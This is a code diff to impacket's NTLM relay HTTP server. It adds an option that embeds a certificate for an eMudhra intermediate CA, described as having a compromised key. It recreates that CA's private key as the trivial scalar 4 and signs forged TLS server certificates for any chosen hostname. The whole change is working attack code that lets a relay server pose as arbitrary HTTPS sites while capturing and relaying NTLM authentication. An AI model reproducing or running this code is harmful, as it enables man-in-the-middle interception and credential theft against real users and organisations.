@@ -22,10 +22,14 @@ import http.server
 import socketserver
 import socket
 import base64
+import datetime
+import ipaddress
+import os
 import random
 import ssl
 import struct
 import string
+import tempfile
 from threading import Thread
 from six import b
 
@@ -35,6 +39,31 @@ from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
+
+# AAA Certificate Services cross-sign for the compromised EM OV TLS CA - G3C key
+EMUDHRA_OV_TLS_CA_G3C_AAA = b"""-----BEGIN CERTIFICATE-----
+MIIDzzCCAregAwIBAgIRAI1aSBGTnvRH13ERzdmEmukwDQYJKoZIhvcNAQELBQAw
+ezELMAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4G
+A1UEBwwHU2FsZm9yZDEaMBgGA1UECgwRQ29tb2RvIENBIExpbWl0ZWQxITAfBgNV
+BAMMGEFBQSBDZXJ0aWZpY2F0ZSBTZXJ2aWNlczAeFw0yNTA1MTQwMDAwMDBaFw0y
+ODEyMzEyMzU5NTlaMEAxCzAJBgNVBAYTAlVTMRQwEgYDVQQKDAtlTXVkaHJhIElu
+YzEbMBkGA1UEAwwSRU0gT1YgVExTIENBIC0gRzNDMHYwEAYHKoZIzj0CAQYFK4EE
+ACIDYgAEE4JRzVKskpjByKrZdzId65fnCb0LTKCspV3IrVHc/J0ViaFZfjpRIOHv
+1jHGPhg1ysrimGmmLhYx6KKBgatWYW3EXZGKvAnzqw5jz3kqpNztc4e+N7ulaVSf
+HAKycO1no4IBNTCCATEwHwYDVR0jBBgwFoAUoBEKIz6W8Qfs4q8p74Klf9AwpLQw
+HQYDVR0OBBYEFDTq6gzryQra+dDF4u2beMmHnhtsMA4GA1UdDwEB/wQEAwIBBjAS
+BgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD
+AjAxBgNVHSAEKjAoMAgGBmeBDAECAjANBgsrBgEEAYOOIQEAATANBgsrBgEEAYOO
+IQECbjBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsLmNvbW9kb2NhLmNvbS9B
+QUFDZXJ0aWZpY2F0ZVNlcnZpY2VzLmNybDA0BggrBgEFBQcBAQQoMCYwJAYIKwYB
+BQUHMAGGGGh0dHA6Ly9vY3NwLmNvbW9kb2NhLmNvbTANBgkqhkiG9w0BAQsFAAOC
+AQEAHlbhZpjhkPEAQVhPHRtBDaHqiisVD20pQ1TUeSx3l62Qe7NQ0b7vWQy7DN0i
+KOu7BGpP5EnIjvXbz9FhpfPJ4FhKEt3tQ51rqXz2oD8vRaryvExWPobDUz3j7HN6
+OzBsVMIe3PD7AAkpky0x8zMSi/ep5R9OMzybmNptbtppyuB5ytgq+h7lQdRIP+CQ
+TaJX3qTgfMqzntYre5GljmEB5hU2/rSn8zoSU2APkJidlZFpghtgbD4I2VRHZvCw
+FFr/SrFM9pwrgbJNZ1MtyTSVgI5NlNb0aMfLR+/r6jJt3ROeY2yh2QQ2dx+Yqgdb
+uL5ChFWOQU+ErSDnUq7yr+pjBQ==
+-----END CERTIFICATE-----"""
 
 class HTTPRelayServer(Thread):
 
@@ -49,8 +78,72 @@ class HTTPRelayServer(Thread):
             socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
 
             if self.config.https:
-                self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-                self.context.load_cert_chain(certfile=self.config.certfile, keyfile=self.config.keyfile)
+                if self.config.emudhra is not None:
+                    self.context = self._create_emudhra_ssl_context(self.config.emudhra)
+                else:
+                    self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                    self.context.load_cert_chain(certfile=self.config.certfile, keyfile=self.config.keyfile)
+
+        @staticmethod
+        def _create_emudhra_ssl_context(hostname):
+            from cryptography import x509
+            from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import ec
+
+            ca_cert = x509.load_pem_x509_certificate(EMUDHRA_OV_TLS_CA_G3C_AAA)
+            ca_key = ec.derive_private_key(4, ec.SECP384R1())
+            key = ec.generate_private_key(ec.SECP384R1())
+            now = datetime.datetime.now(datetime.timezone.utc)
+            try:
+                subject_alt_name = x509.IPAddress(ipaddress.ip_address(hostname))
+            except ValueError:
+                subject_alt_name = x509.DNSName(hostname)
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
+                .issuer_name(ca_cert.subject)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(now - datetime.timedelta(days=1))
+                .not_valid_after(now + datetime.timedelta(days=365))
+                .add_extension(x509.SubjectAlternativeName([subject_alt_name]), critical=False)
+                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
+                .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
+                .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_cert.public_key()), critical=False)
+                .add_extension(x509.KeyUsage(
+                    digital_signature=True,
+                    key_encipherment=False,
+                    content_commitment=False,
+                    data_encipherment=False,
+                    key_agreement=False,
+                    key_cert_sign=False,
+                    crl_sign=False,
+                    encipher_only=False,
+                    decipher_only=False
+                ), critical=True)
+                .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
+                .sign(ca_key, hashes.SHA256())
+            )
+
+            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
+            cert_pem += ca_cert.public_bytes(serialization.Encoding.PEM)
+            key_pem = key.private_bytes(
+                serialization.Encoding.PEM,
+                serialization.PrivateFormat.TraditionalOpenSSL,
+                serialization.NoEncryption()
+            )
+
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            with tempfile.NamedTemporaryFile(mode='wb', suffix='.pem', delete=False) as f:
+                f.write(cert_pem + key_pem)
+                tmpfile = f.name
+            try:
+                context.load_cert_chain(tmpfile)
+            finally:
+                os.unlink(tmpfile)
+
+            return context
 
         def get_request(self):
             sock, addr = socketserver.TCPServer.get_request(self)
